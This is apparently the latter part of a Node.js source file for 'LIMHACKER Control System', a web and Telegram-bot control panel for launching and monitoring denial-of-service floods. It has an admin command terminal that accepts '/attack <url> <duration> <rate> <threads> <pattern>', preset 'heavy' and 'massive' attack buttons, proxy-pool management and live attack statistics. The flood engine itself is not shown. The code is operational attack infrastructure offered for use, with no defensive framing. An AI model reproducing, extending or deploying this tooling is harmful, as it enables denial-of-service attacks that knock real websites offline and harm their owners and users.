        align-items: center;
    }

    .header h1 {
        font-family: var(--font-mono);
        font-size: 2rem;
        font-weight: 600;
        color: var(--accent-primary);
        text-transform: uppercase;
        letter-spacing: 2px;
        text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
    }

    .header h1::before {
        content: '>';
        color: var(--accent-primary);
        margin-right: 0.5rem;
        font-weight: bold;
        animation: blink 1s infinite;
    }

    @keyframes blink {
        0%, 100% { opacity: 1; }
        50% { opacity: 0; }
    }

    .status-badge {
        background: var(--bg-tertiary);
        border: 1px solid var(--border-color);
        border-radius: 20px;
        padding: 0.5rem 1.5rem;
        font-size: 0.9rem;
        font-weight: 500;
        color: var(--accent-primary);
        display: inline-flex;
        align-items: center;
        gap: 0.5rem;
    }

    .status-badge::before {
        content: '';
        width: 8px;
        height: 8px;
        background: var(--accent-primary);
        border-radius: 50%;
        animation: pulse 2s infinite;
    }

    @keyframes pulse {
        0%, 100% { opacity: 1; transform: scale(1); }
        50% { opacity: 0.5; transform: scale(1.2); }
    }

    /* Stats Grid */
    .stats-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 1.5rem;
        margin: 2rem 0;
    }

    .stat-card {
        background: var(--bg-secondary);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1.5rem;
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
        border-left: 4px solid var(--accent-primary);
    }

    .stat-card::after {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(45deg, transparent, rgba(255, 0, 0, 0.05), transparent);
        transform: translateX(-100%);
        animation: shimmer 3s infinite;
    }

    @keyframes shimmer {
        100% { transform: translateX(100%); }
    }

    .stat-card:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 30px var(--shadow-color);
        border-color: var(--accent-primary);
    }

    .stat-value {
        font-size: 2.5rem;
        font-weight: 600;
        color: var(--accent-primary);
        margin-bottom: 0.5rem;
        font-family: var(--font-mono);
    }

    .stat-label {
        color: var(--text-muted);
        font-size: 0.9rem;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    .stat-trend {
        margin-top: 1rem;
        font-size: 0.85rem;
        color: var(--text-secondary);
    }

    /* Terminal Panel */
    .terminal-panel {
        background: var(--bg-secondary);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1.5rem;
        margin: 2rem 0;
        border-left: 4px solid var(--accent-primary);
    }

    .terminal-header {
        display: flex;
        gap: 0.5rem;
        margin-bottom: 1rem;
        padding-bottom: 1rem;
        border-bottom: 1px solid var(--border-color);
    }

    .terminal-dot {
        width: 12px;
        height: 12px;
        border-radius: 50%;
        background: var(--text-muted);
    }

    .terminal-dot:nth-child(1) { background: var(--accent-danger); }
    .terminal-dot:nth-child(2) { background: var(--accent-warning); }
    .terminal-dot:nth-child(3) { background: var(--accent-secondary); }

    .terminal-content {
        font-family: var(--font-mono);
        font-size: 0.95rem;
        line-height: 1.8;
    }

    .terminal-line {
        color: var(--text-secondary);
        margin: 0.5rem 0;
    }

    .terminal-prompt {
        color: var(--accent-primary);
        font-weight: 500;
    }

    /* Attack Items */
    .attack-list {
        margin: 2rem 0;
    }

    .attack-item {
        background: var(--bg-secondary);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1.5rem;
        margin-bottom: 1rem;
        transition: all 0.3s ease;
        border-left: 4px solid var(--accent-primary);
    }

    .attack-item:hover {
        border-color: var(--accent-primary);
        box-shadow: 0 4px 20px var(--shadow-color);
    }

    .attack-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 1rem;
        padding-bottom: 1rem;
        border-bottom: 1px solid var(--border-color);
    }

    .attack-id {
        font-family: var(--font-mono);
        color: var(--accent-primary);
        font-weight: 500;
    }

    .attack-user {
        color: var(--text-muted);
        font-size: 0.9rem;
    }

    .attack-target {
        color: var(--text-secondary);
        margin-bottom: 1rem;
        word-break: break-all;
    }

    .progress-container {
        margin: 1rem 0;
    }

    .progress-bar {
        width: 100%;
        height: 8px;
        background: var(--bg-tertiary);
        border-radius: 4px;
        overflow: hidden;
        margin: 0.5rem 0;
    }

    .progress-fill {
        height: 100%;
        background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
        border-radius: 4px;
        transition: width 0.3s ease;
    }

    .progress-stats {
        display: flex;
        justify-content: space-between;
        color: var(--text-muted);
        font-size: 0.9rem;
    }

    .attack-metrics {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 1rem;
        margin-top: 1rem;
        padding-top: 1rem;
        border-top: 1px solid var(--border-color);
    }

    .metric {
        text-align: center;
    }

    .metric-label {
        color: var(--text-muted);
        font-size: 0.8rem;
        margin-bottom: 0.25rem;
    }

    .metric-value {
        color: var(--accent-primary);
        font-family: var(--font-mono);
        font-weight: 500;
    }

    /* Button Styles */
    .btn {
        background: var(--bg-tertiary);
        border: 1px solid var(--border-color);
        border-radius: 8px;
        padding: 0.75rem 1.5rem;
        color: var(--text-primary);
        font-family: var(--font-sans);
        font-size: 0.95rem;
        font-weight: 500;
        cursor: pointer;
        transition: all 0.3s ease;
        display: inline-flex;
        align-items: center;
        gap: 0.5rem;
        text-decoration: none;
    }

    .btn:hover {
        background: var(--border-color);
        border-color: var(--accent-primary);
        transform: translateY(-1px);
        color: var(--accent-primary);
    }

    .btn-primary {
        background: var(--accent-primary);
        border-color: var(--accent-primary);
        color: white;
    }

    .btn-primary:hover {
        background: var(--accent-secondary);
        border-color: var(--accent-secondary);
    }

    .btn-danger {
        background: var(--accent-danger);
        border-color: var(--accent-danger);
        color: white;
    }

    .btn-danger:hover {
        background: #990000;
        border-color: #990000;
    }

    /* Admin Login Button */
    .admin-login {
        background: transparent;
        border: 1px solid var(--border-color);
        border-radius: 8px;
        padding: 0.75rem 1.5rem;
        color: var(--text-primary);
        text-decoration: none;
        transition: all 0.3s ease;
        margin-left: 1rem;
    }

    .admin-login:hover {
        border-color: var(--accent-primary);
        color: var(--accent-primary);
    }

    /* Footer */
    .footer {
        margin-top: 4rem;
        padding-top: 2rem;
        border-top: 1px solid var(--border-color);
        text-align: center;
        color: var(--text-muted);
        font-size: 0.9rem;
    }

    /* Responsive Design */
    @media (max-width: 768px) {
        .container {
            padding: 1rem;
        }

        .header-content {
            flex-direction: column;
            gap: 1rem;
        }

        .stats-grid {
            grid-template-columns: 1fr;
        }

        .attack-metrics {
            grid-template-columns: repeat(2, 1fr);
        }
    }

    /* Loading Animation */
    .loading {
        display: inline-block;
        width: 20px;
        height: 20px;
        border: 2px solid var(--border-color);
        border-top-color: var(--accent-primary);
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    /* Red Glow Effect */
    .red-glow {
        animation: redGlow 2s ease-in-out infinite;
    }

    @keyframes redGlow {
        0%, 100% { box-shadow: 0 0 10px var(--accent-primary); }
        50% { box-shadow: 0 0 30px var(--accent-primary); }
    }
</style>
`;

// ========== USER PANEL ==========
app.get('/', (req, res) => {
    const uptime = Math.floor((Date.now() - metrics.startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = uptime % 60;
    
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>LIMHACKER Control System</title>
            <link rel="preconnect" href="https://fonts.googleapis.com">
            <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
            ${redTheme}
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="header-content">
                        <h1>LIMHACKER Control System</h1>
                        <div style="display: flex; align-items: center; gap: 1rem;">
                            <span class="status-badge">SYSTEM ONLINE</span>
                            <a href="/login" class="admin-login">ADMIN ACCESS</a>
                        </div>
                    </div>
                </div>

                <div class="terminal-panel">
                    <div class="terminal-header">
                        <span class="terminal-dot"></span>
                        <span class="terminal-dot"></span>
                        <span class="terminal-dot"></span>
                    </div>
                    <div class="terminal-content">
                        <div class="terminal-line">
                            <span class="terminal-prompt">$></span> system.status
                        </div>
                        <div class="terminal-line">
                            <span class="terminal-prompt">  ></span> Uptime: ${hours}h ${minutes}m ${seconds}s
                        </div>
                        <div class="terminal-line">
                            <span class="terminal-prompt">  ></span> Active Attacks: ${attacks.size}
                        </div>
                        <div class="terminal-line">
                            <span class="terminal-prompt">  ></span> Total Requests: ${formatNumber(metrics.totalRequests)}
                        </div>
                        <div class="terminal-line">
                            <span class="terminal-prompt">  ></span> Proxy Pool: ${proxyManager.getStats().active} active
                        </div>
                    </div>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value">${attacks.size}</div>
                        <div class="stat-label">Active Attacks</div>
                        <div class="stat-trend">+${metrics.totalAttacks} total</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${formatNumber(metrics.totalRequests)}</div>
                        <div class="stat-label">Total Requests</div>
                        <div class="stat-trend">Peak: ${metrics.peakRPS} RPS</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${formatBytes(metrics.totalBytes)}</div>
                        <div class="stat-label">Bandwidth Used</div>
                        <div class="stat-trend">${metrics.bandwidth.length > 0 ? metrics.bandwidth.slice(-1)[0].toFixed(2) : 0} Mbps avg</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${proxyManager.getStats().active}</div>
                        <div class="stat-label">Active Proxies</div>
                        <div class="stat-trend">${proxyManager.getStats().avgLatency}ms latency</div>
                    </div>
                </div>

                <div class="attack-list">
                    <h2 style="margin-bottom: 1.5rem; font-weight: 500; color: var(--accent-primary);">Active Attacks</h2>
                    
                    ${Array.from(attacks.entries()).map(([id, attack]) => {
                        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
                        const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
                        const successRate = calculateSuccessRate(attack);
                        return `
                        <div class="attack-item">
                            <div class="attack-header">
                                <span class="attack-id">#${id}</span>
                                <span class="attack-user">@${attack.username}</span>
                            </div>
                            <div class="attack-target">${attack.url}</div>
                            
                            <div class="progress-container">
                                <div class="progress-bar">
                                    <div class="progress-fill" style="width: ${percent}%"></div>
                                </div>
                                <div class="progress-stats">
                                    <span>${percent}% Complete</span>
                                    <span>${elapsed}s / ${attack.duration}s</span>
                                </div>
                            </div>

                            <div class="attack-metrics">
                                <div class="metric">
                                    <div class="metric-label">Requests</div>
                                    <div class="metric-value">${formatNumber(attack.requestCount)}</div>
                                </div>
                                <div class="metric">
                                    <div class="metric-label">Success Rate</div>
                                    <div class="metric-value">${successRate}%</div>
                                </div>
                                <div class="metric">
                                    <div class="metric-label">RPS</div>
                                    <div class="metric-value">${Math.floor(attack.requestCount / Math.max(1, elapsed))}</div>
                                </div>
                                <div class="metric">
                                    <div class="metric-label">Pattern</div>
                                    <div class="metric-value">${attack.pattern.toUpperCase()}</div>
                                </div>
                            </div>
                        </div>
                        `;
                    }).join('')}
                    
                    ${attacks.size === 0 ? `
                    <div style="text-align: center; padding: 4rem; background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border-color);">
                        <p style="color: var(--text-muted);">No active attacks</p>
                        <p style="color: var(--text-muted); margin-top: 1rem;">Use Telegram bot to launch attacks</p>
                    </div>
                    ` : ''}
                </div>

                <div class="footer">
                    <p>LIMHACKER Control System v4.0 | ${new Date().toLocaleString()}</p>
                    <p style="margin-top: 0.5rem;">
                        <button class="btn" onclick="location.reload()">REFRESH</button>
                        <a href="https://t.me/DDOSATTACK67_BOT" class="btn" style="margin-left: 1rem;">TELEGRAM BOT</a>
                    </p>
                </div>
            </div>

            <script>
                // Auto-refresh every 10 seconds
                setTimeout(() => {
                    location.reload();
                }, 10000);
            </script>
        </body>
        </html>
    `);
});

// ========== LOGIN PAGE ==========
app.get('/login', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>LIMHACKER Admin Login</title>
            <link rel="preconnect" href="https://fonts.googleapis.com">
            <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
            ${redTheme}
            <style>
                .login-container {
                    max-width: 400px;
                    margin: 100px auto;
                    background: var(--bg-secondary);
                    border: 1px solid var(--border-color);
                    border-radius: 12px;
                    padding: 2rem;
                    border-left: 4px solid var(--accent-primary);
                }

                .login-header {
                    text-align: center;
                    margin-bottom: 2rem;
                }

                .login-header h1 {
                    font-family: var(--font-mono);
                    font-size: 1.5rem;
                    color: var(--accent-primary);
                }

                .login-header p {
                    color: var(--text-muted);
                    margin-top: 0.5rem;
                }

                .form-group {
                    margin-bottom: 1.5rem;
                }

                .form-group label {
                    display: block;
                    margin-bottom: 0.5rem;
                    color: var(--text-secondary);
                    font-size: 0.9rem;
                }

                .form-group input {
                    width: 100%;
                    padding: 0.75rem;
                    background: var(--bg-tertiary);
                    border: 1px solid var(--border-color);
                    border-radius: 8px;
                    color: var(--text-primary);
                    font-family: var(--font-mono);
                    font-size: 1rem;
                    transition: all 0.3s ease;
                }

                .form-group input:focus {
                    outline: none;
                    border-color: var(--accent-primary);
                    box-shadow: 0 0 0 3px var(--shadow-color);
                }

                .login-btn {
                    width: 100%;
                    padding: 0.75rem;
                    background: var(--accent-primary);
                    color: white;
                    border: none;
                    border-radius: 8px;
                    font-size: 1rem;
                    font-weight: 500;
                    cursor: pointer;
                    transition: all 0.3s ease;
                }

                .login-btn:hover {
                    background: var(--accent-secondary);
                }

                .error-message {
                    background: rgba(255, 0, 0, 0.1);
                    border: 1px solid var(--accent-danger);
                    border-radius: 8px;
                    padding: 1rem;
                    margin-bottom: 1rem;
                    color: var(--accent-danger);
                    text-align: center;
                }

                .back-link {
                    text-align: center;
                    margin-top: 1.5rem;
                }

                .back-link a {
                    color: var(--text-muted);
                    text-decoration: none;
                    font-size: 0.9rem;
                }

                .back-link a:hover {
                    color: var(--accent-primary);
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="login-container">
                    <div class="login-header">
                        <h1>LIMHACKER ADMIN</h1>
                        <p>Enter your credentials</p>
                    </div>

                    ${req.query.error ? '<div class="error-message">Invalid credentials</div>' : ''}

                    <form method="POST" action="/login">
                        <div class="form-group">
                            <label>Password</label>
                            <input type="password" name="password" required autofocus>
                        </div>
                        <button type="submit" class="login-btn">AUTHENTICATE</button>
                    </form>

                    <div class="back-link">
                        <a href="/">← Return to monitor</a>
                    </div>
                </div>
            </div>
        </body>
        </html>
    `);
});

// ========== LOGIN HANDLER ==========
app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        req.session.authenticated = true;
        req.session.loginTime = Date.now();
        res.redirect('/admin');
    } else {
        res.redirect('/login?error=1');
    }
});

// ========== ADMIN PANEL ==========
app.get('/admin', isAuthenticated, (req, res) => {
    const uptime = Math.floor((Date.now() - metrics.startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = uptime % 60;
    const sessionTime = Math.floor((Date.now() - req.session.loginTime) / 1000);
    const sessionHours = Math.floor(sessionTime / 3600);
    const sessionMinutes = Math.floor((sessionTime % 3600) / 60);
    const sessionSeconds = sessionTime % 60;
    
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>LIMHACKER Admin Panel</title>
            <link rel="preconnect" href="https://fonts.googleapis.com">
            <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
            <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
            ${redTheme}
            <style>
                .admin-grid {
                    display: grid;
                    grid-template-columns: repeat(2, 1fr);
                    gap: 1.5rem;
                    margin: 2rem 0;
                }

                .admin-panel {
                    background: var(--bg-secondary);
                    border: 1px solid var(--border-color);
                    border-radius: 12px;
                    padding: 1.5rem;
                    border-left: 4px solid var(--accent-primary);
                }

                .panel-header {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 1.5rem;
                    padding-bottom: 1rem;
                    border-bottom: 1px solid var(--border-color);
                }

                .panel-header h3 {
                    font-weight: 500;
                    color: var(--text-primary);
                }

                .command-input {
                    width: 100%;
                    padding: 1rem;
                    background: var(--bg-tertiary);
                    border: 1px solid var(--border-color);
                    border-radius: 8px;
                    color: var(--text-primary);
                    font-family: var(--font-mono);
                    font-size: 0.95rem;
                    margin: 1rem 0;
                }

                .command-input:focus {
                    outline: none;
                    border-color: var(--accent-primary);
                }

                .command-output {
                    background: var(--bg-tertiary);
                    border: 1px solid var(--border-color);
                    border-radius: 8px;
                    padding: 1rem;
                    max-height: 300px;
                    overflow-y: auto;
                    font-family: var(--font-mono);
                    font-size: 0.9rem;
                    margin-top: 1rem;
                }

                .command-output pre {
                    color: var(--text-secondary);
                    margin: 0.25rem 0;
                    white-space: pre-wrap;
                }

                .button-group {
                    display: flex;
                    gap: 0.5rem;
                    flex-wrap: wrap;
                    margin: 1rem 0;
                }

                .session-info {
                    background: var(--bg-tertiary);
                    border: 1px solid var(--border-color);
                    border-radius: 8px;
                    padding: 1rem;
                    margin-top: 1rem;
                }

                .session-info p {
                    color: var(--text-secondary);
                    margin: 0.25rem 0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="header-content">
                        <h1>LIMHACKER Admin Panel</h1>
                        <div style="display: flex; align-items: center; gap: 1rem;">
                            <span class="status-badge">ADMIN: ${req.sessionID.slice(0, 8)}</span>
                            <a href="/" class="btn">USER VIEW</a>
                            <a href="/logout" class="btn btn-danger">LOGOUT</a>
                        </div>
                    </div>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value">${attacks.size}</div>
                        <div class="stat-label">Active Attacks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${metrics.totalAttacks}</div>
                        <div class="stat-label">Total Attacks</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${templates.size}</div>
                        <div class="stat-label">Templates</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${proxyManager.getStats().active}</div>
                        <div class="stat-label">Active Proxies</div>
                    </div>
                </div>

                <div class="admin-grid">
                    <div class="admin-panel">
                        <div class="panel-header">
                            <h3>Command Terminal</h3>
                            <span class="terminal-prompt">$</span>
                        </div>
                        
                        <input type="text" id="cmdInput" class="command-input" placeholder="Enter command (e.g., /attack https://example.com 60 1000 50 random)" autocomplete="off">
                        
                        <div class="button-group">
                            <button class="btn" onclick="executeCommand()">EXECUTE</button>
                            <button class="btn" onclick="clearOutput()">CLEAR</button>
                            <button class="btn btn-danger" onclick="stopAll()">STOP ALL</button>
                        </div>

                        <div id="commandOutput" class="command-output">
                            <pre>> Terminal ready...</pre>
                            <pre>> Type a command and press EXECUTE</pre>
                        </div>
                    </div>

                    <div class="admin-panel">
                        <div class="panel-header">
                            <h3>Quick Actions</h3>
                            <span class="terminal-prompt">⚡</span>
                        </div>
                        
                        <div class="button-group">
                            <button class="btn" onclick="quickAttack('test')">TEST</button>
                            <button class="btn" onclick="quickAttack('medium')">MEDIUM</button>
                            <button class="btn" onclick="quickAttack('heavy')">HEAVY</button>
                            <button class="btn" onclick="quickAttack('massive')">MASSIVE</button>
                            <button class="btn" onclick="showProxies()">PROXIES</button>
                            <button class="btn" onclick="testProxies()">TEST PROXIES</button>
                            <button class="btn" onclick="systemStats()">SYSTEM</button>
                        </div>

                        <div class="session-info">
                            <h4 style="margin-bottom: 0.5rem; color: var(--text-muted);">Session Info</h4>
                            <p>Session ID: ${req.sessionID.slice(0, 12)}...</p>
                            <p>Duration: ${sessionHours}h ${sessionMinutes}m ${sessionSeconds}s</p>
                            <p>Total Commands: ${commandHistory.length}</p>
                        </div>
                    </div>
                </div>

                <h2 style="margin: 2rem 0 1rem; color: var(--accent-primary);">Active Attacks</h2>
                <div class="attack-list">
                    ${Array.from(attacks.entries()).map(([id, attack]) => {
                        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
                        const percent = Math.min(100, Math.floor((elapsed / attack.duration) * 100));
                        const successRate = calculateSuccessRate(attack);
                        return `
                        <div class="attack-item">
                            <div class="attack-header">
                                <span class="attack-id">#${id}</span>
                                <span class="attack-user">@${attack.username}</span>
                            </div>
                            <div class="attack-target">${attack.url}</div>
                            
                            <div class="progress-container">
                                <div class="progress-bar">
                                    <div class="progress-fill" style="width: ${percent}%"></div>
                                </div>
                                <div class="progress-stats">
                                    <span>${percent}% Complete</span>
                                    <span>${elapsed}s / ${attack.duration}s</span>
                                </div>
                            </div>

                            <div class="attack-metrics">
                                <div class="metric">
                                    <div class="metric-label">Requests</div>
                                    <div class="metric-value">${formatNumber(attack.requestCount)}</div>
                                </div>
                                <div class="metric">
                                    <div class="metric-label">Success</div>
                                    <div class="metric-value">${successRate}%</div>
                                </div>
                                <div class="metric">
                                    <div class="metric-label">RPS</div>
                                    <div class="metric-value">${Math.floor(attack.requestCount / Math.max(1, elapsed))}</div>
                                </div>
                                <div class="metric">
                                    <div class="metric-label">Pattern</div>
                                    <div class="metric-value">${attack.pattern.toUpperCase()}</div>
                                </div>
                            </div>

                            <div style="margin-top: 1rem;">
                                <button class="btn" onclick="stopAttack('${id}')" style="padding: 0.5rem 1rem;">STOP</button>
                                <button class="btn" onclick="showDetails('${id}')" style="padding: 0.5rem 1rem;">DETAILS</button>
                            </div>
                        </div>
                        `;
                    }).join('')}
                </div>

                <div class="footer">
                    <p>LIMHACKER Control System v4.0 | Admin Panel</p>
                </div>
            </div>

            <script>
                // Command execution
                async function executeCommand() {
                    const input = document.getElementById('cmdInput');
                    const cmd = input.value.trim();
                    if (!cmd) return;
                    
                    const res = await fetch('/api/command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({command: cmd})
                    });
                    const data = await res.json();
                    
                    const output = document.getElementById('commandOutput');
                    const newOutput = document.createElement('pre');
                    newOutput.textContent = '> ' + cmd;
                    output.insertBefore(newOutput, output.firstChild);
                    
                    const result = document.createElement('pre');
                    result.textContent = data.output;
                    result.style.color = 'var(--accent-secondary)';
                    output.insertBefore(result, output.firstChild);
                    
                    input.value = '';
                    setTimeout(() => location.reload(), 1000);
                }

                // Quick attacks
                function quickAttack(type) {
                    const attacks = {
                        test: '/attack https://httpbin.org/get 30 100 10 random',
                        medium: '/attack https://httpbin.org/get 60 1000 50 square',
                        heavy: '/attack https://httpbin.org/get 120 5000 100 exponential',
                        massive: '/attack https://httpbin.org/get 300 10000 200 random'
                    };
                    document.getElementById('cmdInput').value = attacks[type];
                    executeCommand();
                }

                // Stop attack
                async function stopAttack(id) {
                    await fetch('/api/command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({command: '/stop ' + id})
                    });
                    location.reload();
                }

                // Stop all attacks
                async function stopAll() {
                    if (confirm('Stop all attacks?')) {
                        await fetch('/api/command', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({command: '/stopall'})
                        });
                        location.reload();
                    }
                }

                // Show proxies
                async function showProxies() {
                    const res = await fetch('/api/proxies');
                    const data = await res.json();
                    const output = document.getElementById('commandOutput');
                    
                    const header = document.createElement('pre');
                    header.textContent = '> PROXY LIST';
                    output.insertBefore(header, output.firstChild);
                    
                    data.proxies.forEach(proxy => {
                        const line = document.createElement('pre');
                        line.textContent = '  ' + proxy;
                        line.style.color = 'var(--text-secondary)';
                        output.insertBefore(line, output.firstChild);
                    });
                }

                // Test proxies
                function testProxies() {
                    document.getElementById('cmdInput').value = '/proxy test';
                    executeCommand();
                }

                // System stats
                function systemStats() {
                    document.getElementById('cmdInput').value = '/system';
                    executeCommand();
                }

                // Show attack details
                function showDetails(id) {
                    document.getElementById('cmdInput').value = '/details ' + id;
                    executeCommand();
                }

                // Clear output
                function clearOutput() {
                    document.getElementById('commandOutput').innerHTML = '<pre>> Terminal cleared...</pre>';
                }

                // Enter key handler
                document.getElementById('cmdInput').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') executeCommand();
                });

                // Auto-refresh
                setInterval(() => {
                    fetch('/api/attacks').catch(() => {});
                }, 5000);
            </script>
        </body>
        </html>
    `);
});

// ========== LOGOUT ==========
app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

// ========== API ENDPOINTS ==========
app.post('/api/command', isAuthenticated, async (req, res) => {
    const { command } = req.body;
    commandHistory.push(command);
    
    try {
        const parts = command.split(' ');
        const cmd = parts[0].toLowerCase();
        let output = '';

        switch(cmd) {
            case '/attack':
                const [_, url, time, rate, threads, pattern] = parts;
                const fakeMsg = {
                    message: { 
                        text: command, 
                        chat: { id: ADMIN_ID }, 
                        from: { id: parseInt(ADMIN_ID), username: 'admin' } 
                    }
                };
                bot.commands.get('attack')(fakeMsg);
                output = 'Attack sequence initiated';
                break;
            case '/stop':
                const id = parts[1];
                const attack = attacks.get(id);
                if (attack) { 
                    attack.process.kill('SIGINT'); 
                    output = `Attack ${id} terminated`; 
                } else output = 'Attack not found';
                break;
            case '/stopall':
                attacks.forEach(a => a.isRunning && a.process.kill('SIGINT'));
                attacks.clear();
                output = 'All attacks stopped';
                break;
            case '/list':
                if (attacks.size === 0) {
                    output = 'No active attacks';
                } else {
                    output = 'Active attacks:\n';
                    attacks.forEach((a, id) => {
                        const elapsed = Math.floor((Date.now() - a.startTime) / 1000);
                        output += `  ${id}: ${a.url} - ${elapsed}s\n`;
                    });
                }
                break;
            case '/stats':
                const running = attacks.size;
                const totalReqs = Array.from(attacks.values()).reduce((s, a) => s + (a.requestCount || 0), 0);
                const proxyStats = proxyManager.getStats();
                output = `Statistics:\n`;
                output += `  Active: ${running}\n`;
                output += `  Total Attacks: ${metrics.totalAttacks}\n`;
                output += `  Total Requests: ${totalReqs.toLocaleString()}\n`;
                output += `  Peak RPS: ${metrics.peakRPS}\n`;
                output += `  Active Proxies: ${proxyStats.active}`;
                break;
            case '/proxies':
                output = Array.from(proxyManager.proxies.keys()).slice(0, 20).join('\n');
                break;
            case '/system':
                const stats = await systemMonitor.getStats();
                if (stats) {
                    output = `System Information:\n`;
                    output += `  CPU Usage: ${stats.cpu}%\n`;
                    output += `  Memory Used: ${formatBytes(stats.memory.used)} (${stats.memory.percentage}%)\n`;
                    output += `  Uptime: ${formatDuration(stats.uptime)}`;
                } else {
                    output = 'Could not retrieve system stats';
                }
                break;
            case '/clear':
                commandHistory.length = 0;
                output = 'History cleared';
                break;
            default:
                output = 'Unknown command. Use /help';
        }
        res.json({ output });
    } catch (err) {
        res.json({ output: `Error: ${err.message}` });
    }
});

app.get('/api/proxies', (req, res) => {
    const proxies = Array.from(proxyManager.proxies.keys()).slice(0, 20);
    res.json({ proxies });
});

app.get('/api/attacks', (req, res) => {
    const list = Array.from(attacks.entries()).map(([id, a]) => ({
        id: id,
        url: a.url,
        elapsed: Math.floor((Date.now() - a.startTime) / 1000),
        duration: a.duration,
        packets: a.requestCount,
        successRate: calculateSuccessRate(a)
    }));
    res.json({ attacks: list });
});

// ========== START SERVER ==========
app.listen(port, HOST, () => {
    console.log('\x1b[31m%s\x1b[0m', `\n┌────────────────────────────────────────┐`);
    console.log('\x1b[31m%s\x1b[0m', `│     LIMHACKER Control System v4.0      │`);
    console.log('\x1b[31m%s\x1b[0m', `├────────────────────────────────────────┤`);
    console.log('\x1b[31m%s\x1b[0m', `│  📱 Telegram: @DDOSATTACK67_BOT        │`);
    console.log('\x1b[31m%s\x1b[0m', `│  👤 Monitor: http://localhost:${port}        │`);
    console.log('\x1b[31m%s\x1b[0m', `│  👑 Admin: http://localhost:${port}/login    │`);
    console.log('\x1b[31m%s\x1b[0m', `│  🔑 Password: ${ADMIN_PASSWORD}         │`);
    console.log('\x1b[31m%s\x1b[0m', `└────────────────────────────────────────┘`);
});

// ========== START BOT ==========
console.log('\n\x1b[31m%s\x1b[0m', '✅ LIMHACKER Control System activated');
console.log('\x1b[31m%s\x1b[0m', '⚡ Ready for operations\n');

bot.launch()
    .then(() => console.log('\x1b[32m%s\x1b[0m', '✅ Telegram bot online'))
    .catch(err => console.error('\x1b[31m%s\x1b[0m', '❌ Bot failed:', err.message));

process.once('SIGINT', () => {
    attacks.forEach(a => a.isRunning && a.process.kill('SIGINT'));
    bot.stop('SIGINT');
    process.exit(0);
});
process.once('SIGTERM', () => {
    bot.stop('SIGTERM');
    process.exit(0);
});